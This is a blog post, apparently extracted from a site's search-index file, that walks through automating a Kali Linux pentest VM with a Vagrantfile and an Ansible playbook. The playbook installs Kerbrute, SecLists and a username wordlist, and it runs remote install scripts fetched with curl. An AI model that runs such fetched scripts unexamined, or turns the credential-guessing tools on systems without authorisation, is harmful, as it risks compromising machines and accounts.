Ansible QEMU/KVM Setup (Linux only) (My preferred setup) QEMU/KVM (≥ 4.2) Libvirt (≥ 6.2.0) Vagrant Ansible For QEMU/KVM shared folder support:\nHost: Linux kernel ≥ 5.4\nGuest: Linux kernel ≥ 5.4\nThere is some additional setup required for the vagrant-libvirt plugin so would advise you checkout QEMU/KVM Setup Guide Unable to resolve dependency vagrant-libvirterror: +Update+ 21/02/2025 I recently ran an update and encountered an issue where it refused to launch new VM\u0026rsquo;s. I received an error similar to the below (it was not exactly the same as I had a crash shortly after). Error message given during initialization: Unable to resolve dependency: user requested 'vagrant-libvirt (= 0.12.2)' after alot of searching I found this post I found following the steps resolved the issue. vagrant plugin repair vagrant plugin expunge --reinstall vagrant plugin update VAGRANT_DISABLE_STRICT_DEPENDENCY_ENFORCEMENT=1 vagrant plugin install vagrant-libvirt The Automation Stack My automation setup consists of three main components:\nVagrant for VM provisioning QEMU/KVM for virtualization Ansible for configuration management Let\u0026rsquo;s dive into each component.\n1. Vagrant with QEMU/KVM I chose QEMU/KVM over VirtualBox for several reasons:\nBetter performance on Linux hosts Once you have used KVM/QEMU you will never go back to VirtualBox etc. Native virtualization support VirtioFS for efficient file sharing The Vagrantfile handles:\nVM resource allocation (RAM, CPU) Network configuration Shared folder setup with VirtioFS Ansible provisioner integration Here\u0026rsquo;s the the Vagrantfile:\n# -*- mode: ruby -*- # vi: set ft=ruby : Vagrant.configure(\u0026#34;2\u0026#34;) do |config| config.vm.box = \u0026#34;kalilinux/rolling\u0026#34; config.vm.hostname = \u0026#34;kali-vm\u0026#34; # Set hostname inside VM # Disable the default share config.vm.synced_folder \u0026#34;.\u0026#34;, \u0026#34;/vagrant\u0026#34;, disabled: true # Force libvirt provider ENV[\u0026#39;VAGRANT_DEFAULT_PROVIDER\u0026#39;] = \u0026#39;libvirt\u0026#39; # QEMU/libvirt specific settings config.vm.provider :libvirt do |libvirt| libvirt.memory = 8192 libvirt.cpus = 4 libvirt.graphics_type = \u0026#34;spice\u0026#34; libvirt.video_type = \u0026#34;qxl\u0026#34; libvirt.title = \u0026#34;Kali Linux VM\u0026#34; # Set VM title in libvirt libvirt.description = \u0026#34;Kali Linux VM for Security Testing\u0026#34; # Optional description # Enable shared memory for VirtioFS libvirt.memorybacking :access, :mode =\u0026gt; \u0026#34;shared\u0026#34; end # Configure shared folders using VirtioFS config.vm.synced_folder \u0026#34;/home/martin/.config/tmuxinator\u0026#34;, \u0026#34;/home/vagrant/.config/tmuxinator\u0026#34;, type: \u0026#34;virtiofs\u0026#34; config.vm.synced_folder \u0026#34;/home/martin/Dropbox/40-49_Career/45-KaliShared/45.02-LinuxTools\u0026#34;, \u0026#34;/home/vagrant/linuxTools\u0026#34;, type: \u0026#34;virtiofs\u0026#34; config.vm.synced_folder \u0026#34;/home/martin/Dropbox/40-49_Career/45-KaliShared/45.01-WindowsTools\u0026#34;, \u0026#34;/home/vagrant/windowsTools\u0026#34;, type: \u0026#34;virtiofs\u0026#34; config.vm.synced_folder \u0026#34;/home/martin/Dropbox/40-49_Career\u0026#34;, \u0026#34;/home/vagrant/Dropbox/40-49_Career\u0026#34;, type: \u0026#34;virtiofs\u0026#34; # Network settings config.vm.network \u0026#34;private_network\u0026#34;, ip: \u0026#34;192.168.57.11\u0026#34; config.ssh.forward_x11 = true # Provisioning configuration for Ansible config.vm.provision \u0026#34;ansible\u0026#34; do |ansible| ansible.playbook = \u0026#34;../../Ansible/configure-kali.yml\u0026#34; end end 2. Ansible Configuration Ansible automates the entire VM setup process. The main playbook handles:\nSystem updates and package installation Development tools setup Security tools installation Terminal environment configuration (Alacritty, Tmux) Editor setup (Doom Emacs) Dotfiles deployment Here\u0026rsquo;s the main Ansible playbook:\n--- - name: Configure Kali Linux hosts: all become: yes # This is equivalent to using sudo vars: user_home: \u0026#34;/home/vagrant\u0026#34; docker_gpg_key_url: \u0026#34;https://download.docker.com/linux/debian/gpg\u0026#34; docker_repo: \u0026#34;deb [arch=amd64 signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/debian bookworm stable\u0026#34; tasks: - name: Update apt cache apt: update_cache: yes cache_valid_time: 3600 - name: Download Iosevka Nerd Font (be patient big file!) get_url: url: https://github.com/ryanoasis/nerd-fonts/releases/download/v3.3.0/Iosevka.zip dest: /tmp/Iosevka.zip mode: \u0026#39;0644\u0026#39; - name: Install unzip if not present apt: name: unzip state: present - name: Extract Iosevka font unarchive: src: /tmp/Iosevka.zip dest: \u0026#34;/usr/local/share/fonts/\u0026#34; remote_src: yes owner: vagrant group: vagrant - name: Update font cache command: fc-cache -fv become_user: vagrant - name: Install base packages apt: name: - eza - alacritty - git - bat - seclists - git - emacs - ripgrep - fd-find state: present - name: Create docker GPG directory file: path: /etc/apt/keyrings state: directory mode: \u0026#39;0755\u0026#39; - name: Check if Docker GPG key exists stat: path: /etc/apt/keyrings/docker.gpg register: docker_gpg - name: Add Docker GPG key shell: | curl -fsSL {{ docker_gpg_key_url }} | gpg --dearmor -o /etc/apt/keyrings/docker.gpg when: not docker_gpg.stat.exists - name: Check if Docker repository exists stat: path: /etc/apt/sources.list.d/docker.list register: docker_repo_file - name: Add Docker repository copy: content: \u0026#34;{{ docker_repo }}\u0026#34; dest: /etc/apt/sources.list.d/docker.list when: not docker_repo_file.stat.exists - name: Install Docker packages apt: name: - docker-ce - docker-ce-cli - containerd.io update_cache: yes state: present - name: Download Starship install script get_url: url: https://starship.rs/install.sh dest: /tmp/starship-install.sh mode: \u0026#39;0755\u0026#39; register: download_script - name: Install Starship shell: /tmp/starship-install.sh --yes args: creates: /usr/local/bin/starship when: download_script is success async: 180 # 5 minute timeout poll: 5 # Check every 5 seconds - name: Install oh-my-zsh become_user: vagrant shell: sh -c \u0026#34;$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\u0026#34; \u0026#34;\u0026#34; --unattended args: creates: \u0026#34;{{ user_home }}/.oh-my-zsh\u0026#34; - name: Install zsh plugins become_user: vagrant git: repo: \u0026#34;{{ item.repo }}\u0026#34; dest: \u0026#34;{{ user_home }}/.oh-my-zsh/custom/plugins/{{ item.name }}\u0026#34; loop: - { repo: \u0026#39;https://github.com/zsh-users/zsh-autosuggestions\u0026#39;, name: \u0026#39;zsh-autosuggestions\u0026#39; } - { repo: \u0026#39;https://github.com/zsh-users/zsh-syntax-highlighting.git\u0026#39;, name: \u0026#39;zsh-syntax-highlighting\u0026#39; } - { repo: \u0026#39;https://github.com/marlonrichert/zsh-autocomplete.git\u0026#39;, name: \u0026#39;zsh-autocomplete\u0026#39; } - { repo: \u0026#39;https://github.com/zdharma-continuum/fast-syntax-highlighting.git\u0026#39;, name: \u0026#39;fast-syntax-highlighting\u0026#39; } - name: Install tmuxinator gem: name: tmuxinator state: present - name: Clone Statistically Likely Usernames git: repo: https://github.com/insidetrust/statistically-likely-usernames.git dest: /usr/share/wordlists/statistically-likely-usernames - name: Download and install Kerbrute get_url: url: https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 dest: /usr/local/bin/kerbrute mode: \u0026#39;0755\u0026#39; - name: Install build dependencies for Emacs apt: name: - build-essential - libgccjit-12-dev - libgnutls28-dev - libjansson4 - libjansson-dev - libncurses-dev - libsqlite3-dev - libgif-dev - libjpeg-dev - libpng-dev - libtiff5-dev - libxpm-dev - libwebp-dev - libgtk-3-dev - texinfo - autoconf - automake - pkg-config state: present install_recommends: no register: pkg_result retries: 3 delay: 5 until: pkg_result is success - name: Install tree-sitter separately apt: name: libtree-sitter-dev state: present register: tree_sitter_result retries: 3 delay: 5 until: tree_sitter_result is success - name: Check if Emacs 29.4 is installed command: emacs --version register: emacs_version ignore_errors: true changed_when: false - name: Clone Emacs repository git: repo: git://git.savannah.gnu.org/emacs.git dest: /tmp/emacs version: emacs-29.4 when: \u0026#34;emacs_version.rc != 0 or \u0026#39;29.4\u0026#39; not in emacs_version.stdout|default(\u0026#39;\u0026#39;)\u0026#34; - name: Run autogen shell: | cd /tmp/emacs ./autogen.sh when: \u0026#34;emacs_version.rc != 0 or \u0026#39;29.4\u0026#39; not in emacs_version.stdout|default(\u0026#39;\u0026#39;)\u0026#34; - name: Configure Emacs shell: | cd /tmp/emacs ./configure --with-native-compilation --with-json --with-tree-sitter --with-sqlite3 args: creates: /tmp/emacs/Makefile when: \u0026#34;emacs_version.rc != 0 or \u0026#39;29.4\u0026#39; not in emacs_version.stdout|default(\u0026#39;\u0026#39;)\u0026#34; - name: Build Emacs shell: | cd /tmp/emacs make -j$(nproc) args: creates: /tmp/emacs/src/emacs when: \u0026#34;emacs_version.rc != 0 or \u0026#39;29.4\u0026#39; not in emacs_version.stdout|default(\u0026#39;\u0026#39;)\u0026#34; async: 1800 poll: 15 - name: Install Emacs become: yes shell: | cd /tmp/emacs make install args: creates: /usr/local/bin/emacs when: \u0026#34;emacs_version.rc != 0 or \u0026#39;29.4\u0026#39; not in emacs_version.stdout|default(\u0026#39;\u0026#39;)\u0026#34; async: 900 poll: 15 - name: Install other base packages apt: name: - eza - alacritty - git - bat - seclists - ripgrep - fd-find state: present install_recommends: no - name: Setup dotfiles become_user: vagrant block: - name: Clone dotfiles git: repo: https://github.com/bloodstiller/kaliconfigs.git dest: \u0026#34;{{ user_home }}/.dotfiles\u0026#34; version: main # Or whatever branch you\u0026#39;re using update: yes # Ensures latest version is cloned clone: yes force: yes # This will overwrite local changes - name: Create required directories file: path: \u0026#34;{{ item }}\u0026#34; state: directory loop: - \u0026#34;{{ user_home }}/.doom.d\u0026#34; - \u0026#34;{{ user_home }}/.config\u0026#34; - name: Create symlinks file: src: \u0026#34;{{ item.src }}\u0026#34; dest: \u0026#34;{{ item.dest }}\u0026#34; state: link force: yes loop: - { src: \u0026#34;{{ user_home }}/.dotfiles/Zsh/.zshrc\u0026#34;, dest: \u0026#34;{{ user_home }}/.zshrc\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Doom/config.el\u0026#34;, dest: \u0026#34;{{ user_home }}/.doom.d/config.el\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Doom/init.el\u0026#34;, dest: \u0026#34;{{ user_home }}/.doom.d/init.el\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Doom/packages.el\u0026#34;, dest: \u0026#34;{{ user_home }}/.doom.d/packages.el\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Doom/README.org\u0026#34;, dest: \u0026#34;{{ user_home }}/.doom.d/README.org\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Starship/starship.toml\u0026#34;, dest: \u0026#34;{{ user_home }}/.config/starship.toml\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Alacritty\u0026#34;, dest: \u0026#34;{{ user_home }}/.config/Alacritty\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Tmux/.tmux.conf\u0026#34;, dest: \u0026#34;{{ user_home }}/.tmux.conf\u0026#34; } - name: Install Doom Emacs become_user: vagrant block: - name: Clone Doom Emacs git: repo: https://github.com/doomemacs/doomemacs dest: \u0026#34;{{ user_home }}/.config/emacs\u0026#34; depth: 1 - name: Install Doom Emacs # This is correct and the path is correct! shell: \u0026#34;{{ user_home }}/.config/emacs/bin/doom install --force\u0026#34; args: creates: \u0026#34;{{ user_home }}/.emacs.d/bin/doom\u0026#34; async: 900 poll: 15 - name: Update Doom recipe repositories shell: \u0026#34;{{ user_home }}/.config/emacs/bin/doom sync -u\u0026#34; async: 900 poll: 15 - name: Enable Docker service systemd: name: docker enabled: yes state: started - name: Add user to docker group user: name: vagrant groups: docker append: yes - name: Clean up apt: autoremove: yes clean: yes 3. Dotfiles and Tool Configuration The automation includes configuration for:\nAlacritty terminal emulator Tmux with custom keybindings Doom Emacs with security-focused packages Starship cross-shell prompt Zsh with Oh My Zsh Each tool has its own configuration module in the repository:\nAlacritty Configuration Tmux Configuration Doom Emacs Configuration Starship Configuration Zsh Configuration Included Tools \u0026amp; Features The automation sets up a comprehensive environment with:\nSecurity Tools SecLists (lots of lists) Kerbrute for Kerberos authentication testing Statistically Likely Usernames wordlist Common pentesting tools (I have my folders for linux \u0026amp; windows tools (I will make a repo for that soon)) Bloodhound for Active Directory analysis (dockerized) Development Environment Emacs 29.4 with native compilation Doom Emacs configuration This is my main editor and I use it for everything but if you prefer another editor you can change the Ansible playbook. Git version control Docker and Docker Compose Build tools and development libraries Modern Terminal Experience Alacritty terminal emulator Starship cross-shell prompt Tmuxinator for session management Command Line Improvements Eza (modern ls replacement) Bat (better cat) Ripgrep for searching fd-find for file discovery Enhanced Zsh configuration: zsh-autosuggestions zsh-syntax-highlighting zsh-autocomplete fast-syntax-highlighting Getting Started To use this automation:\nClone the repository:\ngit clone https://github.com/bloodstiller/kaliconfigs.git cd kaliconfigs Install prerequisites:\n# For Debian/Ubuntu sudo apt install qemu-kvm libvirt-daemon-system libvirt-clients vagrant ansible # For Arch Linux sudo pacman -S qemu-full libvirt vagrant ansible Start the VM:\ncd Vagrant/QEMU vagrant up Development Workflow For efficient development and testing:\nRerun only Ansible playbooks:\nvagrant provision Run Ansible directly against the VM:\nvagrant ssh-config \u0026gt; vagrant-ssh-config ansible-playbook -i .vagrant/provisioners/ansible/inventory/vagrant_ansible_inventory Ansible/configure-kali.yml Use snapshots for safe testing:\nvagrant snapshot save baseline vagrant snapshot restore baseline Customization Options The automation is highly customizable:\nVM Resources (Vagrantfile):\nconfig.vm.provider :libvirt do |libvirt| libvirt.memory = 8192 libvirt.cpus = 4 end Package Selection (Ansible):\n​ - name: Install base packages apt: name: ​ - eza ​ - alacritty ​ - git # Add your packages here Shared Folders:\nconfig.vm.synced_folder \u0026#34;/path/to/host\u0026#34;, \u0026#34;/path/in/guest\u0026#34;, type: \u0026#34;virtiofs\u0026#34; Documentation \u0026amp; Resources For detailed setup and configuration instructions, refer to:\nMain Project Documentation - Overview and quick start guide Ansible Configuration Guide - Detailed playbook customization QEMU/KVM Setup Guide - QEMU-specific installation and configuration Alacritty Configuration - Terminal emulator setup Doom Emacs Configuration - Editor configuration Tmux Configuration - Terminal multiplexer setup Starship Configuration - Shell prompt customization Zsh Configuration - Shell configuration and plugins Conclusion Automating Kali VM setup with QEMU and Ansible has significantly improved my workflow. The combination of Vagrant for VM management, QEMU for virtualization, and Ansible for configuration provides a powerful and flexible automation stack.\nThe complete code is available in my kaliconfigs repository . Feel free to fork it and adapt it to your needs.\nHappy hacking!\n", 
         "url": "\/\/uildDrafts:1313\/tools\/automatingqemukalivmansible\/"
-    },
-    
-    "\/\/uildDrafts:1313\/tags\/automation\/": {
-        "title": "Automation",
-        "tags": [],
-        "content": "", 
-        "url": "\/\/uildDrafts:1313\/tags\/automation\/"
-    },
-    
-    "\/\/uildDrafts:1313\/tags\/dotfiles\/": {
-        "title": "Dotfiles",
-        "tags": [],
-        "content": "", 
-        "url": "\/\/uildDrafts:1313\/tags\/dotfiles\/"
-    },
-    
-    "\/\/uildDrafts:1313\/tags\/kali\/": {
-        "title": "Kali",
-        "tags": [],
-        "content": "", 
-        "url": "\/\/uildDrafts:1313\/tags\/kali\/"
-    },
-    
-    "\/\/uildDrafts:1313\/tags\/qemu\/": {
-        "title": "Qemu",
-        "tags": [],
-        "content": "", 
-        "url": "\/\/uildDrafts:1313\/tags\/qemu\/"
     },
     
     "\/\/uildDrafts:1313\/walkthroughs\/redpanda-box\/": {
